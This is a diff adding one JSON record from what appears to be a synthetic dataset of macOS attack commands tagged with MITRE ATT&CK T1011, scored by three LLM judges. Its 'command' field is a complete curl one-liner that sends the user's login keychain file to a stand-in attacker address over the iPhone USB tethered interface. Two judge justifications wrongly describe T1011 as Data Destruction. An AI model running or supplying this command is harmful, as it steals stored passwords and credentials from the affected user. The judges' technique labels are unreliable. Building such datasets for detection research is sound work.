@@ -1,0 +1,57 @@
+{
+  "technique_id": "T1011",
+  "platform": "macOS",
+  "shell": "Bash",
+  "command": "curl --interface \"$(networksetup -getinfo 'iPhone USB' | awk -F': ' '/IP address/{print $2}')\" --header 'Content-Type: application/octet-stream' --data-binary @/Users/$USER/Library/Keychains/login.keychain-db http://203.0.113.51:52888/k",
+  "explanation": "Uses the iPhone USB (cellular) interface for HTTP exfiltration by binding to its IP, a non-primary network medium per T1011.",
+  "rationale_steps": [
+    "Resolve iPhone USB IP with networksetup",
+    "Bind HTTP request to the tethered interface",
+    "POST binary data to a high, uncommon port"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1011-641961f7-8505cd57",
+  "source_prompt_hash": "641961f7",
+  "timestamp_utc": "2025-09-30T08:21:35.084142Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, proper command substitution, valid flags for curl, and correct use of awk for parsing the network interface information.",
+        "semantic_score": 3,
+        "semantic_justification": "While the command does exfiltrate data (keychain) over HTTP using an alternate network interface (iPhone USB), it doesn't align with T1011 (Data Destruction) but rather with T1048 (Exfiltration Over Alternative Protocol).",
+        "combined_score": 4.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T01:54:46.230758Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quoting, valid flags for 'curl', and correct command substitution syntax for extracting the IP address.",
+        "semantic_score": 1,
+        "semantic_justification": "The command performs data exfiltration of a keychain file, which is entirely misaligned with the stated MITRE ATT&CK T1011 Data Destruction technique.",
+        "combined_score": 3.0,
+        "confidence": 1,
+        "timestamp": "2025-10-02T01:54:52.031167Z"
+      },
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed with balanced quoting, correct command substitution, and valid curl flags.",
+        "semantic_score": 4,
+        "semantic_justification": "Achieves HTTP exfiltration by binding curl to the iPhone USB interface IP (aligned with T1011), though it relies on specific networksetup output and uses a documentation-only destination IP.",
+        "combined_score": 4.5,
+        "confidence": 0.8,
+        "timestamp": "2025-10-02T01:55:45.714880Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 2.667,
+    "llm_average_score": 3.833,
+    "llm_verdict": "uncertain",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
